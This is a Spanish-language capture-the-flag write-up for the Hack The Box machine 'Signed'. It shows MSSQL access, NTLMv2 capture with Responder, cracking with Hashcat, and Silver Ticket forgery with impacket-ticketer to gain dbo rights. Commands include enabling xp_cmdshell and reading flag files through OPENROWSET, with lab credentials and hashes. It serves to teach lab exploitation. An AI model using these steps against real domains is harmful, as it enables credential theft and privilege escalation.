---
title: "Signed Hack The Box"
date: "2026-01-13"
description: "Signed es una máquina Windows enfocada en la explotación avanzada de MSSQL."
difficulty: "Medium"
tags: ["mssql", "silver ticket", "impacket"]
---

![alt text](image.png)


**Servicio Principal:** Microsoft SQL Server 2022 (Puerto 1433)

**Data:** `scott`: `Sm230#C5NatH`

---

## 1. Reconocimiento y Enumeración

Comenzamos escaneando el objetivo, identificando que el puerto **1433** está abierto y ejecutando Microsoft SQL Server 2022. La información de NTLM revela que el nombre del host es **DC01** y el dominio es **SIGNED.HTB**.

**Resultado del Escaneo:**

* **Puerto:** 1433/tcp
* **Servicio:** ms-sql-s
* **Versión:** Microsoft SQL Server 2022 16.00.1000.00; RTM
* **Dominio:** SIGNED.HTB

---

## 2. Acceso Inicial

Con las credenciales nos conectamos al servicio SQL utilizando `impacket-mssqlclient`.

**Comando de conexión:**

```bash
impacket-mssqlclient scott:Sm230#C5NatH@10.10.11.90
```

Una vez dentro, enumeramos las bases de datos disponibles:

```sql
SELECT name FROM master.dbo.sysdatabases;
```

**Salida:** `master`, `tempdb`, `model`, `msdb`.

---

## 3. Escalada de Privilegios (Movimiento Lateral)

Para avanzar, fue necesario comprometer la cuenta de servicio `mssqlsvc`. Esto se logró interceptando una autenticación del servidor.

**Procedimiento (Responder + Hashcat):**

1. **Captura (Sudo Responder):** Se ejecutó la herramienta **Responder** con privilegios de superusuario (`sudo responder ...`) en la máquina atacante para escuchar y envenenar las solicitudes de red, logrando capturar el hash NTLMv2 de la cuenta de servicio.
    
2. **Cracking (Hashcat):** El hash capturado se procesó utilizando **Hashcat**, logrando descifrar la contraseña en texto claro.

Se obtienen credenciales para la cuenta de servicio `mssqlsvc`. Es posible calcular el hash NTLM de esta contraseña para técnicas de *Pass-the-Hash*, o usarla en texto claro.

**Credenciales de Servicio:**

* **Usuario:** `mssqlsvc`
* **Contraseña:** `purPLE9795!@`
* **Hash NTLM:** `ef699384c3285c54128a3ee1ddb1a0cc`

**Cálculo del Hash (Referencia):**

```bash
echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

Nos reconectamos utilizando la cuenta de servicio y autenticación de Windows:

```bash
impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth
```

---

## 4. Configuración del Entorno para Exfiltración

Con las credenciales de `mssqlsvc`, podríamos entrar, pero para asegurar privilegios administrativos completos (`sysadmin`/`dbo`), realizaremos un ataque de **Silver Ticket**. Para ello, necesitamos el **SID del Dominio**.

Dentro de SQL, consultamos el SID binario del usuario actual:

SQL

```
SELECT SUSER_SID(SYSTEM_USER);
-- Resultado: 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```

### Desglose Estructural del SID

Secuencia Hexadecimal segmentada por función:

`01` `05` `000000000005` `15000000` `5b7bb0f3` `98aa2245` `ad4a1ca4` `4f040000`

|**Segmento Hex**|**Componente**|**Valor Decimal / Decodificación**|
|---|---|---|
|**`01`**|Revisión|**S-1**|
|**`05`**|Conteo de Sub-autoridades|**5** (Indica que siguen 5 bloques de 4 bytes)|
|**`000000000005`**|Autoridad Identificadora|**5** (NT Authority)|
|**`15000000`**|Sub-autoridad 1 (Fijo)|**21** (NT Non-Unique)|
|**`5b7bb0f3`**|ID de Dominio Parte 1|**4088429403** (Little Endian: 0xF3B07B5B)|
|**`98aa2245`**|ID de Dominio Parte 2|**1159899800** (Little Endian: 0x4522AA98)|
|**`ad4a1ca4`**|ID de Dominio Parte 3|**2753317549** (Little Endian: 0xA41C4AAD)|
|**`4f040000`**|**RID (Identificador Relativo)**|**1103** (Little Endian: 0x044F)|

**Nota técnica:** Los valores numéricos de las sub-autoridades (Dominio y RID) se almacenan en formato **Little Endian**. Para calcular su valor, se debe invertir el orden de los bytes de cada bloque de 4 (ejemplo RID: `4f 04 00 00`  `00 00 04 4f`).

**Análisis del SID Binario**

El valor hexadecimal devuelto confirma que estás ejecutando la consulta bajo la cuenta de servicio (`MSSQLSVC`).

**Desglose Hexadecimal a Decimal:**

1. **Cabecera:** `010500000000000515000000` (Estándar para cuentas de dominio).
2. **Parte 1 Dominio:** `5b7bb0f3` (Little Endian) -> `0xF3B07B5B` -> **4088429403**
3. **Parte 2 Dominio:** `98aa2245` (Little Endian) -> `0x4522AA98` -> **1159899800**
4. **Parte 3 Dominio:** `ad4a1ca4` (Little Endian) -> `0xA41C4AAD` -> **2753317549**
5. **RID (Usuario actual):** `4f040000` (Little Endian) -> `0x044F` -> **1103**

Identidad Confirmada:

Este SID corresponde exactamente a:

S-1-5-21-4088429403-1159899800-2753317549-1103 (Tu MSSQLSVC_RID).

### Resolución del Objetivo (RID 1105)

Para obtener el nombre del usuario `IT_RID` (1105) usando el puerto 1433, debes inyectar el RID 1105 en la estructura binaria.

b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'

**Cálculo:**

- RID Objetivo: `1105`  
    
- Hexadecimal: `0x0451`  
    
- Little Endian (4 bytes): `51040000`  
    

Comando de Enumeración Manual:

Reemplaza los últimos 4 bytes del SID actual (4f040000) por el RID objetivo (51040000):

SQL

```
SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000);
```

Resultado esperado:

El servidor devolverá DOMINIO\NombreUsuario asociado al RID 1105.

---

## 4. Escalada de Privilegios: Silver Ticket Attack

Teniendo el Hash NTLM de la cuenta de servicio y el SID del dominio, podemos falsificar un Ticket de Servicio (TGS) Kerberos, conocido como **Silver Ticket**. Esto nos permite autenticarnos como cualquier usuario (o nosotros mismos) pero inyectando membresía en grupos privilegiados dentro del PAC del ticket.

Generación del Ticket:

Usamos impacket-ticketer para inyectar los grupos 512 (Domain Admins) y 1105 (IT).

Bash

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc \
-domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
-domain SIGNED.HTB \
-spn MSSQLSvc/sql.signed.htb:1433 \
-groups 512,1105 \
-user-id 1103 mssqlsvc
```

Carga del Ticket:

Exportamos la variable de entorno para que las herramientas de Impacket usen nuestro ticket falsificado.

Bash

```
export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"
```

Conexión vía Kerberos:

Es vital usar el nombre de host (FQDN) sql.signed.htb y el flag -k.

Bash

```
impacket-mssqlclient -k -no-pass sql.signed.htb
```

_Salida exitosa:_ `SQL (SIGNED\mssqlsvc dbo@master)>` (Acceso como dbo).


**Pasos de configuración:**
```
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE
```

*Explicación:* Permite el uso de funciones como `OPENROWSET` para conectar a fuentes de datos externas o leer archivos locales.

- **`sp_configure`:** Procedimiento almacenado del sistema para mostrar o cambiar opciones de configuración global del servidor actual.  
    
- **`'show advanced options', 1`:** Por defecto, SQL Server oculta las opciones peligrosas o avanzadas. Este comando cambia el bit de configuración para hacerlas visibles y modificables.  
    
- **`RECONFIGURE`:** Comando crítico que actualiza el valor configurado actualmente (el que se está ejecutando) con el valor que acabas de establecer. Sin esto, el cambio queda en cola y no tiene efecto inmediato.
---

## 5. Captura de Flags (Loot)

Con la configuración lista, utilizamos la función `OPENROWSET` con el proveedor `BULK` para leer el contenido de los archivos de texto en el sistema de archivos.

### User Flag

Leemos el archivo del escritorio del usuario `mssqlsvc`.

**Comando:**

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS Contents;
```

**Resultado (Flag):**
`2cf3f5ee01f863a66ff8a6c6d397e0c7`

### Root Flag

Leemos el archivo del escritorio del Administrador.

**Comando:**

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
```
**Resultado (Flag):**

`ad05f1cff8b0fce8f5c1a700918df614`

---

## Apéndice Técnico: Explicación de Comandos

Para entender mejor el ataque, aquí se desglosan los comandos SQL críticos utilizados:

### OPENROWSET y BULK

* **`OPENROWSET`:** Permite a SQL Server acceder a datos externos. Aquí se usa para leer el sistema de archivos local.
* **`BULK`:** Especifica que se leerá un archivo de datos sin formato.
* **`SINGLE_CLOB`:** Carga todo el contenido del archivo en una sola celda de texto, ideal para leer flags completas o archivos de configuración.

### xp_cmdshell (Alternativa)

Aunque en este caso usamos `OPENROWSET`, otra técnica común es `xp_cmdshell`.

* **Comando:** `EXEC xp_cmdshell 'type C:\Ruta\Archivo';`
* **Función:** Genera una shell de comandos de Windows (`cmd.exe`) bajo el contexto de seguridad de la cuenta de servicio SQL (`mssqlsvc`).
* **Diferencia:** `OPENROWSET` depende de permisos de lectura de archivos, mientras que `xp_cmdshell` ejecuta binarios. Si uno falla, el otro puede funcionar.